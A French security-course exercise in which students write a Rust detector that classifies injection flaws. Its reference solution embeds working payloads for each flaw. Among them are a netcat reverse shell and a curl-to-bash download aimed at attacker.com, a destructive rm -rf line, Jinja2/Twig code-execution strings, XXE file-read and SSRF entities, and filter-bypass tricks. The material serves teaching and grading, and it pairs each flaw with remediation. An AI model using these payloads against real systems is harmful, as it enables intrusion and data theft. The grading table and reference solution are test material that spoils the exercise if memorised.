# Exercice 3.3.5-a : multi_injection_detector

**Module :**
3.3.5 â€” Injections Non-SQL

**Concept :**
a â€” DÃ©tection et Exploitation Multi-Injection

**DifficultÃ© :**
â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†â˜† (8/10)

**Type :**
code

**Tiers :**
2 â€” MÃ©lange (concepts a + b + c + d + e + f)

**Langage :**
Rust Edition 2024

**PrÃ©requis :**
- 3.3.3.d : SQL Injection Laboratory
- Linux command line basics
- XML fundamentals

**Domaines :**
Net, FS, Process

**DurÃ©e estimÃ©e :**
300 min (5h)

**XP Base :**
400

**ComplexitÃ© :**
T2 O(nÃ—m) Ã— S2 O(n)

---

## ğŸ“ SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier Ã  rendre :**
`multi_injection_detector.rs`

**Fonctions autorisÃ©es :**
- `serde_json` : parsing JSON
- `regex` : pattern matching
- `std::collections::{HashMap, HashSet}`

**Fonctions interdites :**
- ExÃ©cution de commandes rÃ©elles
- `unsafe` blocks
- Appels systÃ¨me

### 1.2 Consigne

#### ğŸ¬ CONTEXTE FUN â€” "Voltron : Form the Injection!"

*"And I'll form the head!"*

Dans Voltron, cinq lions se combinent pour former un robot gÃ©ant. Chaque lion a ses forces. En sÃ©curitÃ©, chaque type d'injection a ses caractÃ©ristiques :

- **Command Injection** = Le Lion Noir (leader, exÃ©cution directe)
- **SSTI** = Le Lion Rouge (templates, rendu dynamique)
- **XXE** = Le Lion Vert (XML, entitÃ©s externes)
- **LDAP Injection** = Le Lion Bleu (directories, recherche)
- **XPath Injection** = Le Lion Jaune (XML navigation)

Comme Voltron dÃ©tecte les menaces, ta fonction dÃ©tecte le TYPE d'injection et gÃ©nÃ¨re les payloads appropriÃ©s. **"Form Voltron!"** = Identifier et combiner les techniques.

**Ta mission :**

Ã‰crire une fonction `multi_injection_detector` qui analyse un snippet de code et dÃ©termine le type de vulnÃ©rabilitÃ© d'injection.

**EntrÃ©e :**
- `input_json` : chaÃ®ne JSON contenant :
  - `code_snippet` : code source vulnÃ©rable
  - `language` : langage (`"Python"`, `"PHP"`, `"Java"`, `"NodeJS"`)
  - `input_source` : source de l'input (`"GET parameter"`, `"POST body"`, `"File upload"`, `"Header"`)
  - `context_hints[]` : indices sur l'environnement

**Sortie :**
- JSON avec :
  - `vulnerability_type` : type d'injection dÃ©tectÃ©
  - `detection_payload` : payload pour confirmer la vulnÃ©rabilitÃ©
  - `exploitation_payloads[]` : payloads d'exploitation avec objectifs
  - `bypass_techniques[]` : techniques de contournement
  - `remediation` : code corrigÃ© et principe

### 1.3 Prototype

```rust
use serde::{Deserialize, Serialize};

pub fn multi_injection_detector(input_json: &str) -> String

#[derive(Debug, Deserialize)]
pub struct InjectionChallenge {
    pub code_snippet: String,
    pub language: String,
    pub input_source: String,
    #[serde(default)]
    pub context_hints: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct InjectionResult {
    pub vulnerability_type: String,
    pub detection_payload: String,
    pub exploitation_payloads: Vec<ExploitPayload>,
    pub bypass_techniques: Vec<BypassTechnique>,
    pub remediation: Remediation,
}

#[derive(Debug, Serialize)]
pub struct ExploitPayload {
    pub payload: String,
    pub goal: String,
}

#[derive(Debug, Serialize)]
pub struct BypassTechnique {
    pub blocked: String,
    pub bypass: String,
}

#[derive(Debug, Serialize)]
pub struct Remediation {
    pub safe_code: String,
    pub principle: String,
}
```

---

## ğŸ’¡ SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 Taxonomie des Injections

```
                    INJECTION TYPES
                         â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚                    â”‚                    â”‚
 COMMAND              DATA                TEMPLATE
    â”‚                    â”‚                    â”‚
â”Œâ”€â”€â”€â”´â”€â”€â”€â”          â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”´â”€â”€â”€â”
â”‚       â”‚          â”‚     â”‚     â”‚         â”‚       â”‚
OS    Shell       SQL   XML   LDAP     SSTI    EL
cmd                    (XXE)  XPath    Jinja   JSP
```

### 2.2 Impact par Type

| Type | Impact Max | Exemple |
|------|------------|---------|
| Command Injection | RCE | `; rm -rf /` |
| SSTI | RCE | `{{config.__class__.__mro__[1].__subclasses__()}}` |
| XXE | SSRF/LFI | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| LDAP | Auth Bypass | `*)(uid=*))(|(uid=*` |
| XPath | Data Exfil | `' or '1'='1` |

---

## ğŸ–¥ï¸ SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ cargo run
=== Voltron Injection Detector v1.0 ===

[TEST 1] Command Injection (Python)...
Code: os.system('ping ' + user_input)
Type: COMMAND_INJECTION
Detection: ; sleep 5
âœ“ PASS

[TEST 2] SSTI (Jinja2)...
Code: render_template_string(user_input)
Type: SSTI
Detection: {{7*7}} â†’ 49
âœ“ PASS

[TEST 3] XXE (XML)...
Code: etree.parse(user_xml)
Type: XXE
Detection: <!ENTITY test SYSTEM "file:///etc/passwd">
âœ“ PASS

=== Results: 12/12 tests passed ===
```

---

## âœ…âŒ SECTION 4 : ZONE CORRECTION

### 4.1 Moulinette

| Test ID | Description | Points |
|---------|-------------|--------|
| `T01` | Command Injection detection | 15 |
| `T02` | SSTI Jinja2 detection | 15 |
| `T03` | SSTI Twig detection | 10 |
| `T04` | XXE detection | 15 |
| `T05` | LDAP Injection detection | 10 |
| `T06` | XPath Injection detection | 10 |
| `T07` | Bypass techniques | 10 |
| `T08` | Remediation quality | 10 |
| `T09` | NULL input | 5 |
| `T10` | Unknown type | 5 |

### 4.3 Solution de rÃ©fÃ©rence

```rust
use serde::{Deserialize, Serialize};
use regex::Regex;

#[derive(Debug, Deserialize)]
pub struct InjectionChallenge {
    pub code_snippet: String,
    pub language: String,
    pub input_source: String,
    #[serde(default)]
    pub context_hints: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct InjectionResult {
    pub vulnerability_type: String,
    pub detection_payload: String,
    pub exploitation_payloads: Vec<ExploitPayload>,
    pub bypass_techniques: Vec<BypassTechnique>,
    pub remediation: Remediation,
}

#[derive(Debug, Serialize)]
pub struct ExploitPayload {
    pub payload: String,
    pub goal: String,
}

#[derive(Debug, Serialize)]
pub struct BypassTechnique {
    pub blocked: String,
    pub bypass: String,
}

#[derive(Debug, Serialize)]
pub struct Remediation {
    pub safe_code: String,
    pub principle: String,
}

#[derive(Debug, Serialize)]
pub struct ErrorResult {
    pub error: String,
}

pub fn multi_injection_detector(input_json: &str) -> String {
    if input_json.trim().is_empty() || input_json.trim() == "null" {
        return serde_json::to_string(&ErrorResult {
            error: "NULL_INPUT".to_string(),
        }).unwrap();
    }

    let challenge: InjectionChallenge = match serde_json::from_str(input_json) {
        Ok(c) => c,
        Err(e) => return serde_json::to_string(&ErrorResult {
            error: format!("PARSE_ERROR: {}", e),
        }).unwrap(),
    };

    let vuln_type = detect_injection_type(&challenge);
    let result = generate_result(&vuln_type, &challenge);

    serde_json::to_string_pretty(&result).unwrap()
}

fn detect_injection_type(challenge: &InjectionChallenge) -> String {
    let code = &challenge.code_snippet;
    let hints = &challenge.context_hints;

    // Command Injection patterns
    let cmd_patterns = [
        r"os\.system\s*\(",
        r"subprocess\.\w+\s*\(.+shell\s*=\s*True",
        r"exec\s*\(",
        r"eval\s*\(",
        r"system\s*\(",
        r"`.*\$",
        r"shell_exec\s*\(",
        r"passthru\s*\(",
        r"popen\s*\(",
        r"Runtime\.getRuntime\(\)\.exec",
        r"child_process\.exec",
    ];

    for pattern in cmd_patterns {
        if Regex::new(pattern).unwrap().is_match(code) {
            return "COMMAND_INJECTION".to_string();
        }
    }

    // SSTI patterns
    let ssti_patterns = [
        r"render_template_string\s*\(",
        r"Twig.*render\s*\(",
        r"\.render\s*\(\s*\{",
        r"Template\s*\(",
        r"freemarker",
        r"velocity",
    ];

    let ssti_hints = ["Jinja2", "Twig", "Freemarker", "Velocity", "Template"];
    let has_ssti_hint = hints.iter().any(|h| ssti_hints.iter().any(|s| h.contains(s)));

    for pattern in ssti_patterns {
        if Regex::new(pattern).unwrap().is_match(code) || has_ssti_hint {
            return "SSTI".to_string();
        }
    }

    // XXE patterns
    let xxe_patterns = [
        r"etree\.parse",
        r"XMLParser",
        r"DocumentBuilder",
        r"SAXParser",
        r"xml\.dom",
        r"simplexml_load",
        r"DOMDocument",
    ];

    for pattern in xxe_patterns {
        if Regex::new(pattern).unwrap().is_match(code) {
            return "XXE".to_string();
        }
    }

    // LDAP Injection patterns
    let ldap_patterns = [
        r"ldap_search\s*\(",
        r"ldap\.search\s*\(",
        r"LdapContext",
        r"SearchControls",
        r"\(cn=.*\$",
    ];

    for pattern in ldap_patterns {
        if Regex::new(pattern).unwrap().is_match(code) {
            return "LDAP_INJECTION".to_string();
        }
    }

    // XPath Injection patterns
    let xpath_patterns = [
        r"xpath\s*\(",
        r"XPathFactory",
        r"evaluate\s*\(",
        r"selectNodes\s*\(",
        r"DOMXPath",
    ];

    for pattern in xpath_patterns {
        if Regex::new(pattern).unwrap().is_match(code) {
            return "XPATH_INJECTION".to_string();
        }
    }

    // EL Injection
    if code.contains("${") || code.contains("#{") {
        return "EL_INJECTION".to_string();
    }

    "UNKNOWN".to_string()
}

fn generate_result(vuln_type: &str, challenge: &InjectionChallenge) -> InjectionResult {
    match vuln_type {
        "COMMAND_INJECTION" => generate_command_injection_result(challenge),
        "SSTI" => generate_ssti_result(challenge),
        "XXE" => generate_xxe_result(challenge),
        "LDAP_INJECTION" => generate_ldap_result(challenge),
        "XPATH_INJECTION" => generate_xpath_result(challenge),
        "EL_INJECTION" => generate_el_result(challenge),
        _ => InjectionResult {
            vulnerability_type: "UNKNOWN".to_string(),
            detection_payload: "N/A".to_string(),
            exploitation_payloads: vec![],
            bypass_techniques: vec![],
            remediation: Remediation {
                safe_code: "Unable to determine vulnerability type".to_string(),
                principle: "Manual review required".to_string(),
            },
        },
    }
}

fn generate_command_injection_result(challenge: &InjectionChallenge) -> InjectionResult {
    let is_linux = challenge.context_hints.iter()
        .any(|h| h.to_lowercase().contains("linux"));

    InjectionResult {
        vulnerability_type: "COMMAND_INJECTION".to_string(),
        detection_payload: "; sleep 5".to_string(),
        exploitation_payloads: vec![
            ExploitPayload {
                payload: "; cat /etc/passwd".to_string(),
                goal: "File read".to_string(),
            },
            ExploitPayload {
                payload: "$(whoami)".to_string(),
                goal: "Command substitution".to_string(),
            },
            ExploitPayload {
                payload: "; nc -e /bin/sh attacker.com 4444".to_string(),
                goal: "Reverse shell".to_string(),
            },
            ExploitPayload {
                payload: "| curl attacker.com/shell.sh | bash".to_string(),
                goal: "Download and execute".to_string(),
            },
        ],
        bypass_techniques: vec![
            BypassTechnique {
                blocked: ";".to_string(),
                bypass: "|| or &&".to_string(),
            },
            BypassTechnique {
                blocked: "spaces".to_string(),
                bypass: "${IFS}".to_string(),
            },
            BypassTechnique {
                blocked: "cat".to_string(),
                bypass: "c'a't or c\\at".to_string(),
            },
            BypassTechnique {
                blocked: "/".to_string(),
                bypass: "${PATH:0:1}".to_string(),
            },
        ],
        remediation: Remediation {
            safe_code: match challenge.language.as_str() {
                "Python" => "subprocess.run(['ping', '-c', '1', user_input], shell=False)".to_string(),
                "PHP" => "escapeshellarg($user_input)".to_string(),
                "Java" => "ProcessBuilder with argument list".to_string(),
                _ => "Use parameterized APIs without shell".to_string(),
            },
            principle: "Never use shell=True or string concatenation with user input".to_string(),
        },
    }
}

fn generate_ssti_result(challenge: &InjectionChallenge) -> InjectionResult {
    let template_engine = challenge.context_hints.iter()
        .find(|h| h.contains("Jinja") || h.contains("Twig") || h.contains("Freemarker"))
        .map(|s| s.as_str())
        .unwrap_or("Jinja2");

    let payloads = if template_engine.contains("Jinja") {
        vec![
            ExploitPayload {
                payload: "{{7*7}}".to_string(),
                goal: "Detection (returns 49)".to_string(),
            },
            ExploitPayload {
                payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}".to_string(),
                goal: "RCE via config".to_string(),
            },
            ExploitPayload {
                payload: "{{''.__class__.__mro__[1].__subclasses__()}}".to_string(),
                goal: "List available classes".to_string(),
            },
        ]
    } else if template_engine.contains("Twig") {
        vec![
            ExploitPayload {
                payload: "{{7*7}}".to_string(),
                goal: "Detection".to_string(),
            },
            ExploitPayload {
                payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}".to_string(),
                goal: "RCE via Twig".to_string(),
            },
        ]
    } else {
        vec![
            ExploitPayload {
                payload: "${7*7}".to_string(),
                goal: "Detection".to_string(),
            },
        ]
    };

    InjectionResult {
        vulnerability_type: "SSTI".to_string(),
        detection_payload: "{{7*7}}".to_string(),
        exploitation_payloads: payloads,
        bypass_techniques: vec![
            BypassTechnique {
                blocked: "{{".to_string(),
                bypass: "{% %} or {# #}".to_string(),
            },
            BypassTechnique {
                blocked: "config".to_string(),
                bypass: "request.application.__globals__".to_string(),
            },
        ],
        remediation: Remediation {
            safe_code: "render_template('template.html', user_data=user_input) # Never render_template_string".to_string(),
            principle: "Never pass user input directly to template rendering".to_string(),
        },
    }
}

fn generate_xxe_result(_challenge: &InjectionChallenge) -> InjectionResult {
    InjectionResult {
        vulnerability_type: "XXE".to_string(),
        detection_payload: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>".to_string(),
        exploitation_payloads: vec![
            ExploitPayload {
                payload: "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">".to_string(),
                goal: "Local file read".to_string(),
            },
            ExploitPayload {
                payload: "<!ENTITY xxe SYSTEM \"http://internal-server/\">".to_string(),
                goal: "SSRF".to_string(),
            },
            ExploitPayload {
                payload: "<!ENTITY xxe SYSTEM \"expect://id\">".to_string(),
                goal: "RCE (if expect:// enabled)".to_string(),
            },
        ],
        bypass_techniques: vec![
            BypassTechnique {
                blocked: "ENTITY".to_string(),
                bypass: "Parameter entities: <!ENTITY % xxe SYSTEM>".to_string(),
            },
            BypassTechnique {
                blocked: "SYSTEM".to_string(),
                bypass: "PUBLIC identifier".to_string(),
            },
        ],
        remediation: Remediation {
            safe_code: "parser.setFeature('http://apache.org/xml/features/disallow-doctype-decl', True)".to_string(),
            principle: "Disable DTD processing and external entities".to_string(),
        },
    }
}

fn generate_ldap_result(_challenge: &InjectionChallenge) -> InjectionResult {
    InjectionResult {
        vulnerability_type: "LDAP_INJECTION".to_string(),
        detection_payload: "*)(uid=*))(|(uid=*".to_string(),
        exploitation_payloads: vec![
            ExploitPayload {
                payload: "*)(|(password=*))".to_string(),
                goal: "Authentication bypass".to_string(),
            },
            ExploitPayload {
                payload: "admin)(&)".to_string(),
                goal: "Always true condition".to_string(),
            },
        ],
        bypass_techniques: vec![
            BypassTechnique {
                blocked: "*".to_string(),
                bypass: "Null byte injection".to_string(),
            },
        ],
        remediation: Remediation {
            safe_code: "ldap.filter.escape_filter_chars(user_input)".to_string(),
            principle: "Always escape LDAP special characters".to_string(),
        },
    }
}

fn generate_xpath_result(_challenge: &InjectionChallenge) -> InjectionResult {
    InjectionResult {
        vulnerability_type: "XPATH_INJECTION".to_string(),
        detection_payload: "' or '1'='1".to_string(),
        exploitation_payloads: vec![
            ExploitPayload {
                payload: "' or '1'='1' or '".to_string(),
                goal: "Authentication bypass".to_string(),
            },
            ExploitPayload {
                payload: "'] | //user/password | //user['".to_string(),
                goal: "Data extraction".to_string(),
            },
        ],
        bypass_techniques: vec![
            BypassTechnique {
                blocked: "or".to_string(),
                bypass: "| union syntax".to_string(),
            },
        ],
        remediation: Remediation {
            safe_code: "Use parameterized XPath queries or XQuery".to_string(),
            principle: "Never concatenate user input in XPath expressions".to_string(),
        },
    }
}

fn generate_el_result(_challenge: &InjectionChallenge) -> InjectionResult {
    InjectionResult {
        vulnerability_type: "EL_INJECTION".to_string(),
        detection_payload: "${7*7}".to_string(),
        exploitation_payloads: vec![
            ExploitPayload {
                payload: "${Runtime.getRuntime().exec('id')}".to_string(),
                goal: "RCE in Java EL".to_string(),
            },
        ],
        bypass_techniques: vec![],
        remediation: Remediation {
            safe_code: "Disable EL evaluation for user input".to_string(),
            principle: "Never evaluate EL expressions with user data".to_string(),
        },
    }
}
```

### 4.10 Solutions Mutantes

#### Mutant A (Boundary) : Confusion SSTI/Command

```rust
fn detect_injection_type_mutant_a(challenge: &InjectionChallenge) -> String {
    // BUG: DÃ©tecte SSTI quand c'est command injection avec eval()
    if challenge.code_snippet.contains("eval") {
        return "SSTI".to_string(); // Faux! eval en Python = command injection
    }
}
```

#### Mutant B (Safety) : Regex panic

```rust
fn detect_injection_type_mutant_b(challenge: &InjectionChallenge) -> String {
    // BUG: Utilise le code user comme pattern regex
    let re = Regex::new(&challenge.code_snippet).unwrap();
}
```

#### Mutant C (Logic) : Pas de bypass pour Linux

```rust
fn generate_command_injection_result_mutant_c(challenge: &InjectionChallenge) -> InjectionResult {
    // BUG: Bypass vides si Linux
    InjectionResult {
        bypass_techniques: vec![], // Manque ${IFS}, etc.
        // ...
    }
}
```

#### Mutant D (Return) : Toujours COMMAND_INJECTION

```rust
fn detect_injection_type_mutant_d(_: &InjectionChallenge) -> String {
    "COMMAND_INJECTION".to_string() // BUG: Ignore l'analyse
}
```

#### Mutant E (Edge) : XXE sans SSRF payload

```rust
fn generate_xxe_result_mutant_e() -> InjectionResult {
    // BUG: Manque le payload SSRF
    InjectionResult {
        exploitation_payloads: vec![
            ExploitPayload {
                payload: "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">".to_string(),
                goal: "File read".to_string(),
            },
            // Manque: SSRF payload!
        ],
    }
}
```

#### Mutant F : Ignore context_hints

```rust
fn generate_ssti_result_mutant_f(_challenge: &InjectionChallenge) -> InjectionResult {
    // BUG: Toujours Jinja2 payloads, ignore Twig hint
    let payloads = vec![
        ExploitPayload { payload: "{{7*7}}".to_string(), goal: "Detection".to_string() },
    ];
    // ...
}
```

---

## ğŸ§  SECTION 5 : COMPRENDRE

### 5.1 Ce que cet exercice enseigne

| Injection | Sink | Impact |
|-----------|------|--------|
| Command | os.system, exec | RCE |
| SSTI | render_template_string | RCE |
| XXE | XML parser | LFI/SSRF |
| LDAP | ldap_search | Auth bypass |
| XPath | xpath query | Data leak |

### 5.8 MnÃ©motechniques

#### ğŸ¤– MEME : "Voltron - Form the Injection!"

```
COMMAND = Lion Noir (Leader) â†’ Direct shell access
SSTI    = Lion Rouge (Fire)  â†’ Template magic
XXE     = Lion Vert (Forest) â†’ XML entities
LDAP    = Lion Bleu (Water)  â†’ Directory queries
XPath   = Lion Jaune (Earth) â†’ XML navigation

Ensemble: "FORM VOLTRON!" â†’ Full pentest coverage
```

---

## ğŸ“¦ SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "exercise_slug": "3.3.5-a-multi-injection-detector",
    "metadata": {
      "exercise_id": "3.3.5-a",
      "difficulty": 8,
      "language": "rust",
      "duration_minutes": 300,
      "xp_base": 400,
      "meme_reference": "Voltron"
    },
    "cwe_mapping": {
      "primary": "CWE-78",
      "secondary": ["CWE-611", "CWE-90", "CWE-643", "CWE-1336"]
    }
  }
}
```

---

*HACKBRAIN v5.5.2 â€” Multi-Injection Detector*
*"Form Voltron... Form the Injection!"*